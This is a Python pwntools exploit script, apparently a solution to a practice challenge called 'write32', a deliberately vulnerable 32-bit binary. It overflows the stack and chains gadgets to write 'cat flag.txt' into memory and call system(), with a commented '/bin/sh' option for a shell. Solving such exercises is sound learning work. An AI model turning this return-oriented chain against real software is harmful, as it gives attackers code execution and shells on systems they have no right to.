from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./write432')
# p = process('./write432')

def write_that_there(that, there):
    there = p32(there)
    assert len(that) == 4
    payload = b''
    payload += pop_edi_ebp
    payload += there
    payload += that.encode()
    payload += mov_edi_ebp
    return payload

padding = 'A'*44
system = p32(0x0804865a)
data = 0x0804a028
cmd = 'cat flag.txt'
# cmd = '/bin/sh\0'
pop_edi_ebp = p32(0x080486da)
mov_edi_ebp = p32(0x08048670)

payload = padding.encode()
payload += write_that_there(cmd[:4],data)
payload += write_that_there(cmd[4:8],data+4)
payload += write_that_there(cmd[8:],data+8)
payload += system
payload += p32(data)

# p.sendline(payload)
# print(p.recvall().decode())
# p.interactive()
sys.stdout.buffer.write(payload)
